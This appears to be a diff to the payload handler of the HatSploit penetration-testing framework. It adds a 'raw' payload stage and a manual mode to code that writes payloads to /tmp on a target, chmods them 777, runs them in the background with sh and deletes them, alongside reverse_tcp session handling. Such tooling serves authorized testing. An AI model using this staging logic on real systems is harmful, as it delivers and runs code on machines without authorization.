@@ -112,7 +112,7 @@ class Handler(Server):
             byte_octals.append(byte_octal)
         return ''.join(byte_octals)
 
-    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+    def wget_stage(self, payload, sender, args=[], payload_args="", delim=';',
                    location='/tmp'):
         self.badges.print_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
@@ -136,7 +136,7 @@ class Handler(Server):
         sender(*args, {command})
         requests.delete(wget_container)
 
-    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+    def echo_stage(self, payload, sender, args=[], payload_args="", delim=';',
                    location='/tmp', linemax=100):
         self.badges.print_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
@@ -162,7 +162,7 @@ class Handler(Server):
 
         sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
     
-    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+    def printf_stage(self, payload, sender, args=[], payload_args="", delim=';',
                      location='/tmp', linemax=100):
         self.badges.print_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
@@ -187,6 +187,12 @@ class Handler(Server):
         args = args if args is not None else ""
 
         sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
+
+    def raw_stage(self, payload, sender, args=[]):
+        self.badges.print_process("Sending payload stage...")
+        self.badges.print_process("Executing payload...")
+
+        sender(*args, payload)
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
@@ -214,7 +220,7 @@ class Handler(Server):
 
     def handle_session(self, host, port, payload, sender=None, args=[],
                        delim=';', remote_host=None, location='/tmp', timeout=None,
-                       method=None, post="printf", linemax=100):
+                       method=None, manual=False, post="printf", linemax=100):
         if payload['Payload'] is None:
             self.badges.print_error("Payload stage is not found!")
             return False
@@ -222,7 +228,18 @@ class Handler(Server):
         if sender is not None:
             session = payload['Session'] if payload['Session'] is not None else HatSploitSession
             if payload['Category'].lower() == 'stager':
-                if post.lower() == 'printf':
+                if post.lower() == 'raw':
+                    self.do_job(
+                        "Handler raw Stage",
+                        payload,
+                        self.raw_stage,
+                        [
+                            payload['Raw'],
+                            sender,
+                            args
+                        ]
+                    )
+                elif post.lower() == 'printf':
                     self.do_job(
                         "Handler printf Stage",
                         payload,
@@ -296,7 +313,6 @@ class Handler(Server):
                 return False
         else:
             if method is not None:
-                encode = True
                 if method.lower() == 'reverse_tcp':
                     new_session, new_remote_host = self.listen_session(host, port, timeout, HatSploitSession)
                     if not new_session and not new_remote_host:
@@ -309,7 +325,18 @@ class Handler(Server):
                         return False
 
                 if payload['Category'].lower() == 'stager':
-                    if post.lower() == 'printf':
+                    if post.lower() == 'raw':
+                        self.do_job(
+                            "Handler raw Stage",
+                            payload,
+                            self.raw_stage,
+                            [
+                                payload['Raw'],
+                                sender,
+                                args
+                            ]
+                        )
+                    elif post.lower() == 'printf':
                         self.do_job(
                             "Handler printf Stage",
                             payload,
@@ -382,8 +409,9 @@ class Handler(Server):
                     self.badges.print_error("Invalid payload category!")
                     return False
             else:
-                self.badges.print_error("Failed to execute payload stage!")
-                return False
+                if manual is False:
+                    self.badges.print_error("Failed to execute payload stage!")
+                    return False
 
         session = payload['Session'] if payload['Session'] is not None else HatSploitSession
 
